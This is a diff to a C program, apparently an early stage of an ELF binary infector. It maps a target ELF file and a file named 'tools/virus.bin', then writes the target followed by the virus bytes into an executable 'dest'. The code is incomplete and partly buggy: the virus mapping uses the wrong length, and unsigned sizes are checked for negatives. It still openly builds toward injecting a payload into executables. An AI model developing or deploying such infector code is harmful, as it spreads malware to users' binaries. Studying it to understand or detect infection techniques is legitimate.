@@ -22,8 +22,11 @@
 int				main(int argc, char **argv)
 {
 	size_t		size;
+	size_t		sizevirus;
 	int		fd;
 	char		*map;
+	char		*virus;
+	int			fd3;
 	Elf64_Ehdr	*hdr;
 
 	if (argc != 2) {
@@ -36,9 +39,26 @@ int				main(int argc, char **argv)
 		perror("open");
 		return (1);
 	}
+
 	if ((size = lseek(fd, 0, SEEK_END)) < 0) {
 		perror("lseek");
 		return (1);
+	}
+
+	if ((fd3 = open("tools/virus.bin", O_RDONLY)) < 0) {
+		perror("open");
+		return (1);
+	}
+
+	if ((sizevirus = lseek(fd3, 0, SEEK_END)) < 0) {
+		perror("lseek");
+		return (1);
+	}
+
+	virus = (char *)mmap(0, size, PROT_READ | PROT_WRITE, MAP_FILE | MAP_PRIVATE, fd3, 0);
+	if (virus == MAP_FAILED) {
+		perror("mmap");
+		return (1);	
 	}
 
 	map = (char *)mmap(0, size, PROT_READ | PROT_WRITE, MAP_FILE | MAP_PRIVATE, fd, 0);
@@ -52,15 +72,15 @@ int				main(int argc, char **argv)
 	hdr = (Elf64_Ehdr *)map;
 	parse_ph_64(hdr, size);
 
-	printf("\n Entry point : %llx\n", hdr->e_entry);
-
 	int fd2 = open("dest", O_RDWR|O_CREAT, 0755);
 	if (fd2) {
 		write(fd2, map, size);
+		write(fd2, virus, sizevirus);
 		close(fd2);
 	}
 
 	munmap(map, size);
+	munmap(virus, sizevirus);
 	close(fd);
 	return (0);
 }
